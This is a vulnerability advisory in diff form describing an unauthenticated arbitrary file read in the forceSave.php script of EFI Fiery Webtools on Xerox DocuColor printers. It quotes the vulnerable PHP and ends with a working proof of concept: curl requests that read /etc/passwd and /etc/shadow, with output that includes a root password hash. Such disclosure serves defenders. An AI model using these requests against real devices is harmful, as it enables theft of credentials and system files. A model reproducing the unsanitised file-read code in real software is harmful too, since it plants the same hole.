@@ -1,0 +1,142 @@
+Xerox DC260 EFI Fiery Controller Webtools 2.0 Arbitrary File Disclosure
+
+
+Vendor: Electronics for Imaging, Inc.
+Product web page: http://www.efi.com
+Affected version: EFI Fiery Controller SW2.0
+                  Xerox DocuColor 260, 250, 242
+
+Summary: Drive production profitability with Fiery servers and workflow
+products. See which Fiery digital front end is right for your current
+or future print engines and business needs. Manage all your printers
+from a single screen using this intuitive print job management interface.
+
+Desc: Input passed thru the 'file' GET parameter in 'forceSave.php'
+script is not properly sanitized before being used to read files. This
+can be exploited by an unauthenticated attacker to read arbitrary files
+on the affected system.
+
+======================================================================
+/wt3/js/save.js:
+----------------
+
+103: function parseSaveMessages() {
+104:     var urlNode = saveDocument.getElementsByTagName('url').item(0);
+105:     var url = urlNode.firstChild.data;
+106:     var forcedSaveUrl = "forceSave.php?file=" + url;
+107:     window.open(forcedSaveUrl, 'save_iframe', 'width=1,height=1');
+
+====
+
+/wt3/forceSave.php:
+-------------------
+ 1. <?php
+ 2. //code posted by chrisputnam at gmail dot com
+ 3. function readfile_chunked($filename,$retbytes=true)
+ 4. {
+ 5.     $chunksize = 1*(1024*1024); // how many bytes per chunk
+ 6.     $buffer = '';
+ 7.     $cnt =0;
+ 8.     // $handle = fopen($filename, 'rb');
+ 9.     $handle = fopen($filename, 'rb');
+10.     if ($handle === false)
+11.     {
+12.          return false;
+13.     }
+14.     while (!feof($handle))
+15.     {
+16.          //read a chunk
+17.          $buffer = fread($handle, $chunksize);
+18.          //send the chunk
+19.          echo $buffer;
+20.          //flush the chunk
+21.          flush();
+22.          //increment the size read/sent
+23.          if ($retbytes)
+24.          {
+25.            $cnt += strlen($buffer);
+26.          }
+27.     }
+28.     //close file
+29.     $status = fclose($handle);
+30.     if ($retbytes && $status)
+31.     {
+32.          return $cnt; // return num. bytes delivered like readfile() does.
+33.     }
+34.     return $status;
+35. }
+36.
+37. $filename = $_GET['file'];
+38. if(!$filename)
+39. { 
+40.     echo "ERROR: No filename specified. Please try again."; 
+41. }
+42. else
+43. {
+44.     // fix for IE caching or PHP bug issue
+45.     header("Pragma: public");
+46.     header("Expires: 0"); // set expiration time
+47.     header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+48.     // browser must download file from server instead of cache
+49.
+50.     // force download dialog
+51.     header("Content-Type: application/force-download");
+52.     header("Content-Type: application/octet-stream");
+53.     header("Content-Type: application/download");
+54.
+55.     // use the Content-Disposition header to supply a recommended filename and
+56.     // force the browser to display the save dialog.
+57.     header("Content-Disposition: attachment; filename=" . basename($filename) . ";");
+58.     header("Content-Transfer-Encoding: binary");
+59.
+60.     header("Content-Length: " . filesize($filename));
+61.
+62.     set_time_limit(0);
+63.     readfile_chunked($filename, false);
+64.
+65.     exit();
+66. }
+67.
+68. ?> 
+
+======================================================================
+
+
+Tested on: Debian GNU/Linux 3.1
+           Apache
+           PHP/5.4.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5447
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5447.php
+
+
+20.12.2017
+
+--
+
+
+# curl "http://10.0.0.19/wt3/forceSave.php?file=/etc/passwd"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:100:sync:/bin:/bin/sync
+games:x:5:100:games:/usr/games:/bin/sh
+...
+...
+
+
+# curl "http://10.0.0.19/wt3/forceSave.php?file=/etc/shadow"
+root:LUUVeT6GbOy9I:10978:0:99999:7:::
+daemon:*:10979:0:99999:7:::
+bin:*:10979:0:99999:7:::
+sys:*:10979:0:99999:7:::
+sync:*:10979:0:99999:7:::
+games:*:10979:0:99999:7:::
+...
+...
